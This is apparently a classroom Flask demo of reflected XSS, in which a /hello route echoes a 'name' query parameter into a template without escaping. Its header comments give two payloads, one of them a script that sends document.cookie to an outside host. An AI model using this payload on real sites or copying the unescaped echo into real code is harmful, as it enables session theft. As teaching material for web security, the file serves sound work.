# An example of reflected XSS
# To run: flask --app live_reflected_xss  --debug run
# (The --debug will allow auto reload)
# Exploit examples:
## Example 1: simply pop up a message saying "Hi"
### <script>alert("hi")</script>
## Example 2: send cookies to an external location
### <script>var%20img=new%20Image();document.body.appendChild(img);img.src="https://jdasilv2.pythonanywhere.com/hacked/"%2Bdocument.cookie;document.body.appendChild(img);</script>

from flask import Flask
from flask import render_template, make_response, request
from html import escape


app = Flask(__name__)

@app.route("/hello")
def hello_world():
    # TODO: change hello world example to echo back the user's name 
    # passed to it as a request parameter
    n = request.args.get("name")
    return render_template("live_reflected_xss.jinja", name=n)





